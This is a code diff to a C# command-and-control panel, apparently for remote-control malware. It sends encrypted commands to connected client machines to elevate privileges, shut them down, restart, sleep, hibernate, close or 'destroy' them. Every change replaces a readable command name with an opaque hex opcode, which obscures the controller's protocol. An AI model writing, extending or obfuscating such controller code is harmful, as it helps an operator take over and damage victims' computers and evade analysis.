@@ -158,7 +158,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("CloseReq", 
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x10", 
                     Cryptography.Encrypt(Guid.NewGuid().ToString()));
             }
         }
@@ -200,7 +200,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x12", Cryptography.Encrypt(Guid.NewGuid().ToString()));
             }
         }
 
@@ -208,7 +208,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq", 
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07", 
                     Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
             }
         }
@@ -217,7 +217,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                     Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
             }
         }
@@ -226,7 +226,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                     Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
             }
         }
@@ -235,7 +235,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("SetPowerStateReq",
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x07",
                     Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
             }
         }
@@ -244,7 +244,7 @@ namespace CNC
         {
             for (int i = 0; i < clientListView.SelectedItems.Count; i++)
             {
-                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("DestroyReq",
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("0x27",
                     Cryptography.Encrypt(Guid.NewGuid().ToString()));
             }
         }
